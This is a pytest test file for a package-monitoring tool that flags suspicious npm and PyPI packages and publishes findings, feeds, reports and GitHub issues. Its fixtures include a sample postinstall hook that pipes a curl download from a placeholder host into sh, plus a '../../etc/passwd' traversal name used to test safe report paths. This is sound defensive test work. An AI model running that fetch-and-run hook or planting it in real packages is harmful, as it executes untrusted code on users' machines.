import json
import xml.etree.ElementTree as ET
from collections import Counter
from datetime import UTC, datetime, timedelta

import httpx
import pytest
import respx

from pkgwatch.output import issues, json_out, reports, rss
from pkgwatch.output.json_out import RunCounts
from pkgwatch.scoring import analyze
from pkgwatch.util import read_json

NOW = datetime(2026, 11, 15, 12, 30, tzinfo=UTC)
REPO_API = "https://api.github.com/repos/abidranesh/typosquat_-_mal_package_tracker"


def record(
    name="lodahs", version="1.0.0", score=85, severity="high", eco="npm", day="2026-11-15", minute=0
):
    return {
        "key": f"{eco}/{name}/{version}",
        "ecosystem": eco,
        "name": name,
        "version": version,
        "score": score,
        "severity": severity,
        "published_at": f"{day}T10:00:00Z",
        "scanned_at": f"2026-11-15T12:{minute:02d}:00Z",
        "description": "utilities",
        "registry_url": json_out.registry_url(eco, name, version),
        "targets": ["lodash"],
        "findings": [
            {
                "id": "typosquat",
                "severity": "medium",
                "weight": 25,
                "message": "Name is 1 edit(s) from popular package 'lodash'.",
                "target": "lodash",
            },
            {
                "id": "npm-install-hook",
                "severity": "high",
                "weight": 40,
                "message": "'postinstall' script runs a shell <at> install & more.",
                "evidence": {
                    "path": "package.json",
                    "snippet": '"postinstall": "curl https://example.invalid | sh ```"',
                },
            },
        ],
    }


def counts(**kw):
    out = RunCounts()
    for key, value in kw.items():
        getattr(out, key).update(value)
    return out


# ---------------------------------------------------------------- records and shards


def test_make_record_from_a_real_analysis(make_ctx):
    ctx = make_ctx(
        "npm",
        "@evil/lodahs",
        "1.0.0",
        manifest={"scripts": {"postinstall": "curl https://example.invalid | sh"}},
        published_at=NOW - timedelta(hours=1),
        description="d" * 400,
    )
    made = json_out.make_record(ctx, analyze(ctx), NOW)
    assert made["key"] == "npm/@evil/lodahs/1.0.0" and made["severity"] == "medium"
    assert made["registry_url"] == "https://www.npmjs.com/package/@evil/lodahs/v/1.0.0"
    assert (
        made["scanned_at"] == "2026-11-15T12:30:00Z"
        and made["published_at"] == "2026-11-15T11:30:00Z"
    )
    assert len(made["description"]) == 160 and made["findings"][0]["id"] == "npm-install-hook"
    json.dumps(made)  # serialisable
    assert (
        json_out.registry_url("pypi", "Foo_Bar", "1.0") == "https://pypi.org/project/Foo_Bar/1.0/"
    )
    assert json_out.registry_url("pypi", "foo") == "https://pypi.org/project/foo/"
    assert json_out.registry_url("npm", "foo") == "https://www.npmjs.com/package/foo"


def test_merge_shards_by_publish_day_and_dedupes(tmp_path):
    first = [record("a"), record("b", day="2026-11-14"), record("c", minute=5)]
    assert len(json_out.merge_shards(tmp_path, first)) == 3
    day = read_json(tmp_path / "data" / "findings" / "2026" / "11" / "15.json")
    assert day["date"] == "2026-11-15" and [r["name"] for r in day["findings"]] == ["c", "a"]
    assert (tmp_path / "data" / "findings" / "2026" / "11" / "14.json").exists()
    # A rescan of the same version replaces the record and is not counted as new.
    again = record("a", score=90)
    assert json_out.merge_shards(tmp_path, [again, record("d")]) == [record("d")]
    day = read_json(json_out.day_path(tmp_path, "2026-11-15"))
    assert len(day["findings"]) == 3
    assert next(r for r in day["findings"] if r["name"] == "a")["score"] == 90


def test_record_day_falls_back_to_scan_date():
    undated = record()
    undated["published_at"] = None
    assert json_out.record_day(undated) == "2026-11-15"


def test_update_latest_is_newest_first_and_capped(tmp_path, config):
    many = [record(f"p{i:04d}", minute=i % 60) for i in range(520)]
    latest = json_out.update_latest(tmp_path, many, config)
    assert len(latest) == 500
    assert latest[0]["scanned_at"] >= latest[-1]["scanned_at"]
    doc = read_json(tmp_path / "data" / "latest.json")
    assert doc["updated"] == latest[0]["scanned_at"] and len(doc["findings"]) == 500
    # Merging the same key again does not duplicate it.
    again = json_out.update_latest(tmp_path, [many[0]], config)
    assert len({r["key"] for r in again}) == len(again) == 500
    empty = tmp_path / "empty"
    assert json_out.update_latest(empty, [], config) == []
    assert read_json(empty / "data" / "latest.json") == {"findings": [], "updated": None}


def test_no_unflagged_data_is_written(tmp_path, config):
    """Only aggregate counts exist for packages that were scanned and not listed."""
    json_out.merge_shards(tmp_path, [])
    json_out.update_latest(tmp_path, [], config)
    json_out.update_stats(tmp_path, counts(scanned={"npm": 900, "pypi": 400}), NOW, config)
    json_out.write_index(tmp_path)
    files = sorted(p.relative_to(tmp_path).as_posix() for p in tmp_path.rglob("*") if p.is_file())
    assert files == ["data/findings/index.json", "data/latest.json", "data/stats.json"]
    assert read_json(tmp_path / "data" / "findings" / "index.json") == {"days": {}}


# ---------------------------------------------------------------- stats


def test_update_stats_accumulates_totals_daily_hourly_and_detectors(tmp_path, config):
    run = counts(
        scanned={"npm": 100, "pypi": 50},
        flagged={"npm": 3, "pypi": 1},
        high={"npm": 1},
        detectors={"typosquat": 3, "obfuscation": 1},
    )
    json_out.update_stats(tmp_path, run, NOW, config)
    stats = json_out.update_stats(tmp_path, run, NOW + timedelta(hours=1), config)
    assert stats["totals"]["scanned"] == 300 and stats["totals"]["flagged"] == 8
    assert stats["totals"]["by_ecosystem"]["npm"] == {"scanned": 200, "flagged": 6, "high": 2}
    day = stats["daily"]["2026-11-15"]
    assert day["scanned"] == 300 and day["by_ecosystem"]["pypi"]["flagged"] == 2
    assert day["detectors"] == {"typosquat": 6, "obfuscation": 2}
    assert stats["hourly"] == {
        "2026-11-15T12": {"scanned": 150, "flagged": 4, "high": 1},
        "2026-11-15T13": {"scanned": 150, "flagged": 4, "high": 1},
    }
    assert stats["top_detectors"][0] == {"id": "typosquat", "count": 6}
    assert stats["window_days"] == 90 and stats["updated"] == "2026-11-15T13:30:00Z"


def test_stats_windows_roll_but_totals_are_kept(tmp_path, config):
    run = counts(scanned={"npm": 10}, flagged={"npm": 1}, detectors={"typosquat": 1})
    json_out.update_stats(tmp_path, run, NOW - timedelta(days=100), config)
    json_out.update_stats(tmp_path, run, NOW - timedelta(days=89), config)
    json_out.update_stats(tmp_path, run, NOW - timedelta(hours=50), config)
    stats = json_out.update_stats(tmp_path, run, NOW, config)
    assert stats["totals"]["scanned"] == 40
    assert sorted(stats["daily"]) == ["2026-08-18", "2026-11-13", "2026-11-15"]
    assert list(stats["hourly"]) == ["2026-11-15T12"]
    assert stats["top_detectors"] == [{"id": "typosquat", "count": 3}]


# ---------------------------------------------------------------- retention


def test_prune_shards_removes_files_older_than_365_days(tmp_path, config):
    json_out.merge_shards(
        tmp_path,
        [
            record("old", day="2025-11-14"),
            record("older", day="2024-01-02"),
            record("edge", day="2025-11-16"),
            record("new"),
        ],
    )
    assert json_out.prune_shards(tmp_path, NOW, config) == 2
    assert [day for day, _ in json_out.list_days(tmp_path)] == ["2025-11-16", "2026-11-15"]
    assert not (tmp_path / "data" / "findings" / "2024").exists()  # empty folders are removed
    assert json_out.prune_shards(tmp_path, NOW, config) == 0
    assert json_out.write_index(tmp_path) == {"2025-11-16": 1, "2026-11-15": 1}


def test_list_days_ignores_stray_files(tmp_path):
    stray = tmp_path / "data" / "findings" / "notes" / "x" / "y.json"
    stray.parent.mkdir(parents=True)
    stray.write_text("{}", encoding="utf-8")
    assert json_out.list_days(tmp_path) == []


def test_live_high_keys(tmp_path):
    json_out.merge_shards(tmp_path, [record("a"), record("b", severity="low", score=20)])
    assert json_out.live_high_keys(tmp_path) == {"npm/a/1.0.0"}


def test_write_health(tmp_path):
    run = counts(scanned={"npm": 5}, flagged={"npm": 1}, skipped={"gone": 2})
    run.errors.append("npm/x: boom")
    run.warnings.extend(f"w{i}" for i in range(20))
    json_out.write_health(tmp_path, NOW, run, 12.345)
    health = read_json(tmp_path / "data" / "health.json")
    assert health["status"] == "ok" and health["last_success"] == "2026-11-15T12:30:00Z"
    assert health["duration_seconds"] == 12.3 and health["scanned"] == 5
    assert health["package_errors"] == 1 and health["skipped"] == {"gone": 2}
    assert len(health["warnings"]) == 10


# ---------------------------------------------------------------- RSS


def test_feeds_are_valid_rss_with_neutral_language(tmp_path, config):
    records = [record("a", minute=9), record("b", severity="low", score=20, minute=3)]
    rss.write_feeds(tmp_path, records, config)
    root = ET.fromstring((tmp_path / "feed.xml").read_bytes())
    assert root.tag == "rss" and root.get("version") == "2.0"
    channel = root.find("channel")
    assert channel.findtext("title").startswith("PkgWatch:")
    assert channel.findtext("link") == config.project["site_url"]
    assert channel.findtext("lastBuildDate") == "Sun, 15 Nov 2026 12:09:00 GMT"
    items = channel.findall("item")
    assert len(items) == 2
    first = items[0]
    assert first.findtext("title") == "[HIGH 85] suspicious npm package: a 1.0.0"
    assert first.findtext("link").endswith("#/npm/a/1.0.0")
    assert first.find("guid").get("isPermaLink") == "false"
    assert first.findtext("guid") == "pkgwatch:npm/a/1.0.0"
    assert [c.text for c in first.findall("category")] == ["typosquat", "npm-install-hook"]
    body = first.findtext("description")
    assert "&lt;at&gt; install &amp; more" in body and "Report a false positive" in body
    whole = (tmp_path / "feed.xml").read_text(encoding="utf-8").lower()
    assert "malware" not in whole and "malicious" not in whole

    high = ET.fromstring((tmp_path / "feed-high.xml").read_bytes())
    assert [i.findtext("guid") for i in high.iter("item")] == ["pkgwatch:npm/a/1.0.0"]
    assert "high-risk" in high.find("channel").findtext("title")


def test_feed_is_stable_capped_and_valid_when_empty(config):
    records = [record(f"p{i}") for i in range(150)]
    feed = rss.build_feed(records, config)
    assert feed == rss.build_feed(records, config)  # no timestamps of its own, so no churn
    assert len(ET.fromstring(feed).findall("./channel/item")) == config.output["feed_items"]
    empty = ET.fromstring(rss.build_feed([], config))
    assert empty.find("channel").find("item") is None
    scoped = record("@scope/pkg")
    assert rss.detail_url(config, scoped).endswith("#/npm/@scope/pkg/1.0.0")


# ---------------------------------------------------------------- reports


def test_report_text_is_complete_and_never_mentions_accounts(config):
    scoped = record("@evilcorp/lodahs")
    scoped["findings"][0]["message"] = "Name resembles popular package '@types/node'."
    scoped["targets"] = ["@types/node"]
    text = reports.render_report(scoped, config)
    assert text.startswith("# Suspicious package report: `@evilcorp/lodahs` 1.0.0 (npm)")
    assert "Risk score | 85 / 100 (high)" in text
    assert "https://www.npmjs.com/package/@evilcorp/lodahs/v/1.0.0" in text
    assert "**npm-install-hook** (high, +40)" in text
    assert "not** installed or executed" in text and "false positives happen" in text
    assert "issues/new?template=false-positive.yml" in text
    # Outside code spans and URLs, every @ is broken up so GitHub notifies nobody.
    prose = [
        line
        for line in text.splitlines()
        if "`" not in line and "http" not in line and not line.startswith("  ")
    ]
    assert all("@" not in line.replace("@<!-- -->", "") for line in prose)
    assert "'@<!-- -->types/node'" in text
    # The snippet contains a backtick run, so the fence must be longer than it.
    assert "  ````text" in text
    assert "malware" not in text.lower().replace("report malware", "").replace("as malware", "")


def test_fence_and_safe_text():
    assert reports.fence("plain").startswith("```text\n")
    assert reports.fence("a ```` b").startswith("`````text\n")
    assert (
        reports.safe_text("@scope/name and user@host")
        == "@<!-- -->scope/name and user@<!-- -->host"
    )


def test_false_positive_url_is_prefilled(config):
    url = reports.false_positive_url(config, record("@scope/pkg"))
    assert url.startswith(
        "https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?"
    )
    assert "template=false-positive.yml" in url and "labels=false-positive" in url
    assert "title=False%20positive%3A%20npm%2F%40scope%2Fpkg%401.0.0" in url


def test_report_paths_are_safe_and_bounded(tmp_path):
    assert (
        reports.report_path(tmp_path, record("@scope/pkg"))
        == tmp_path / "npm" / "scope__pkg-1.0.0.md"
    )
    hostile = reports.report_path(tmp_path, record("../../etc/passwd", "1.0/../../x"))
    assert (
        hostile.parent == tmp_path / "npm" and ".." not in hostile.name and "/" not in hostile.name
    )
    long_a = reports.report_path(tmp_path, record("a" * 200, "1.0.0-" + "b" * 100))
    long_b = reports.report_path(tmp_path, record("a" * 201, "1.0.0-" + "b" * 100))
    assert len(long_a.name) <= 130 and long_a != long_b
    assert reports.report_path(tmp_path, record("...", "..")).name == "_-_.md"


def test_write_and_prune_reports(tmp_path, config):
    records = [record("a"), record("b", severity="medium", score=50), record("c", eco="pypi")]
    written = reports.write_reports(tmp_path, records, config)
    assert sorted(p.relative_to(tmp_path).as_posix() for p in written) == [
        "npm/a-1.0.0.md",
        "pypi/c-1.0.0.md",
    ]
    assert (
        (tmp_path / "npm" / "a-1.0.0.md")
        .read_text(encoding="utf-8")
        .startswith("# Suspicious package report")
    )
    assert reports.prune_reports(tmp_path, [record("a")]) == 1
    assert (
        not (tmp_path / "pypi" / "c-1.0.0.md").exists()
        and (tmp_path / "npm" / "a-1.0.0.md").exists()
    )


def test_write_reports_survives_unwritable_paths(tmp_path, config, monkeypatch):
    def refuse(self, *args, **kwargs):
        raise OSError("path too long")

    monkeypatch.setattr("pathlib.Path.write_text", refuse)
    assert reports.write_reports(tmp_path, [record("a")], config) == []


# ---------------------------------------------------------------- GitHub issues


def search_result(*titles):
    return {"total_count": len(titles), "items": [{"title": t} for t in titles]}


@respx.mock
def test_open_issues_creates_one_issue_per_new_high_finding(client, config, tmp_path):
    label = respx.post(f"{REPO_API}/labels").respond(201, json={"name": "needs-triage"})
    search = respx.get("https://api.github.com/search/issues").respond(json=search_result())
    create = respx.post(f"{REPO_API}/issues").respond(
        201, json={"html_url": "https://github.com/x/y/issues/7"}
    )
    reports.write_reports(tmp_path, [record("a")], config)
    records = [
        record("a"),
        record("b", severity="medium", score=50),
        record("low", severity="low", score=20),
    ]
    created, backlog, warnings = issues.open_issues(client, config, records, tmp_path)
    assert created == ["https://github.com/x/y/issues/7"] and backlog == [] and warnings == []
    assert label.call_count == 1 and search.call_count == 1 and create.call_count == 1
    sent = json.loads(create.calls.last.request.content)
    assert sent["title"] == "[PkgWatch] Suspicious package: npm/a@1.0.0"
    assert sent["labels"] == ["needs-triage"]
    assert sent["body"].startswith("# Suspicious package report: `a` 1.0.0 (npm)")
    assert create.calls.last.request.headers["authorization"] == "Bearer test-token"
    query = search.calls.last.request.url.params["q"]
    assert (
        query == 'repo:abidranesh/typosquat_-_mal_package_tracker is:issue in:title "npm/a@1.0.0"'
    )


@respx.mock
def test_existing_issue_is_not_duplicated_and_existing_label_is_fine(client, config, tmp_path):
    respx.post(f"{REPO_API}/labels").respond(422, json={"message": "already_exists"})
    respx.get("https://api.github.com/search/issues").respond(
        json=search_result("[PkgWatch] Suspicious package: npm/a@1.0.0", "unrelated")
    )
    create = respx.post(f"{REPO_API}/issues").respond(201, json={})
    created, backlog, warnings = issues.open_issues(client, config, [record("a")], tmp_path)
    assert created == [] and backlog == [] and warnings == [] and not create.called


@respx.mock
def test_similar_titles_do_not_count_as_duplicates(client, config, tmp_path):
    respx.post(f"{REPO_API}/labels").respond(201, json={})
    respx.get("https://api.github.com/search/issues").respond(
        json=search_result("[PkgWatch] Suspicious package: npm/a@1.0.01")
    )
    create = respx.post(f"{REPO_API}/issues").respond(201, json={"html_url": "u"})
    created, _, _ = issues.open_issues(client, config, [record("a")], tmp_path)
    assert created == ["u"] and create.called
    # No report file on disk: the body is rendered on demand.
    assert json.loads(create.calls.last.request.content)["body"].startswith(
        "# Suspicious package report"
    )


@respx.mock
def test_issue_cap_and_api_failure_feed_the_backlog(client, config, tmp_path):
    cap = config.limits["max_issues_per_run"]
    respx.post(f"{REPO_API}/labels").respond(403)
    respx.get("https://api.github.com/search/issues").respond(json=search_result())
    create = respx.post(f"{REPO_API}/issues").mock(
        side_effect=[
            httpx.Response(201, json={"html_url": "one"}),
            httpx.Response(403, json={"message": "rate limit"}),
        ]
    )
    records = [record(f"p{i:02d}") for i in range(cap + 3)]
    created, backlog, warnings = issues.open_issues(client, config, records, tmp_path)
    assert created == ["one"] and create.call_count == 2
    assert backlog[0] == "npm/p01/1.0.0" and len(backlog) == cap + 2  # everything not created
    assert (
        len(warnings) == 2 and "label" in warnings[0] and "stopped at npm/p01/1.0.0" in warnings[1]
    )


@respx.mock
def test_no_high_findings_means_no_api_calls(client, config, tmp_path):
    assert issues.open_issues(client, config, [record("a", severity="low")], tmp_path) == (
        [],
        [],
        [],
    )
    assert respx.calls.call_count == 0


@respx.mock
def test_ensure_label_raises_on_unexpected_errors(client, config):
    respx.post(f"{REPO_API}/labels").respond(401)
    with pytest.raises(Exception, match="401"):
        issues.ensure_label(client, config)


def test_run_counts_defaults():
    run = RunCounts()
    assert isinstance(run.scanned, Counter) and run.errors == [] and run.warnings == []
